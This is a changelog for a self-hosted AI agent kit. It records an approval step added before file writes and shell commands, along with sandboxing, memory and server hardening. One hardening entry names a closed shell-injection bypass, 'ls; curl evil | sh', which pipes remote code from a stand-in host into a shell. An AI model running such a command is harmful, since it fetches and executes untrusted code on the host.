# Changelog

All notable changes to SelfHosted Agent Kit are documented here.
Format: [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), SemVer.

## [1.1.0] — 2026-11-14

### Added
- **Action approval**: in the web UI the agent now asks before every `write_file`
  and `run_shell` call (Allow / Refuse buttons, 5-minute timeout counts as a refusal).
  Read-only tools run without asking. Set `AGENT_APPROVAL=auto` for the old
  behaviour, `AGENT_APPROVAL_TIMEOUT` to change the delay.
- `POST /api/approve` endpoint and an `approval` SSE event for custom clients.
- 19 more tests (91 total) covering allow, refuse, timeout, read-only tools and auto mode.

### Changed
- Default behaviour is now safer: nothing is written or executed without your click.

## [1.0.0] — 2026-01-31

First public release.

### Added
- OpenAI-compatible streaming LLM client built on `urllib` (no SDK, no `httpx`),
  with fragmented `tool_calls` reassembly and `reasoning_content` forwarding.
- Agent loop with configurable step budget, tool-error feedback to the model and
  context trimming.
- Seven sandboxed tools: `list_dir`, `read_file`, `write_file`, `search_text`,
  `run_shell`, `memory_save`, `memory_list`.
- Workspace sandbox: path resolution + symlink escape detection, destructive
  shell pattern screen, optional executable allow-list.
- Long-term memory: one Markdown file per memory with front matter, index injected
  into the system prompt, atomic writes.
- Session persistence as JSON files, with create/load/list/delete.
- HTTP server: static UI, token auth (constant-time compare), SSE chat endpoint,
  REST endpoints for sessions and memories, `/healthz`.
- Vanilla web UI: streaming text, tool cards, reasoning panel, session sidebar,
  memory and config dialogs, no build step.
- Deployment: `install.sh` (with `--systemd`), `run.sh`, `Dockerfile`,
  `docker-compose.yml`, hardened systemd unit.
- 72 pytest tests covering tools, sandbox escapes, memory, engine loop, LLM client
  and every HTTP route — no network or API key required.

### Hardening (same release, after internal review)
- Per-session locks instead of one global lock: a second chat returns `409`
  immediately instead of hanging behind another conversation.
- Tool failures of any kind are returned to the model as `error: …` instead of
  escaping and aborting the agent loop.
- `AGENT_SHELL_ALLOW` now execs directly (`shell=False`) and refuses shell
  metacharacters, closing the `ls; curl evil | sh` bypass.
- Session truncation drops orphan `tool` messages and dangling `tool_calls`, which
  previously made a long conversation unusable (provider `400`).
- The transcript is persisted even when the client disconnects mid-stream.
- Atomic writes (unique temp file + `os.replace`) for sessions and memories.
- `stream_options.include_usage` so token usage is reported in streaming mode.
- Inline `#` comments in `.env` values are stripped; absolute paths are no longer
  leaked in error responses; `/api/chat` caps messages at 32 000 characters.

### Known limitations
- Single-token auth (no multi-user accounts).
- Sessions stored as JSON files: fine for single-user/small-team use, swap
  `SessionStore` for a database for higher volume.
- The shell sandbox is a guard-rail, not a containment boundary — run the agent
  as an unprivileged user or in a container.

## Backlog (not yet scheduled)
- Sub-agents (explorer / reviewer / worker) delegated by the main agent.
- Rate limiting and per-token usage accounting.
- WebSocket transport as an alternative to SSE.
- Optional PostgreSQL session backend.
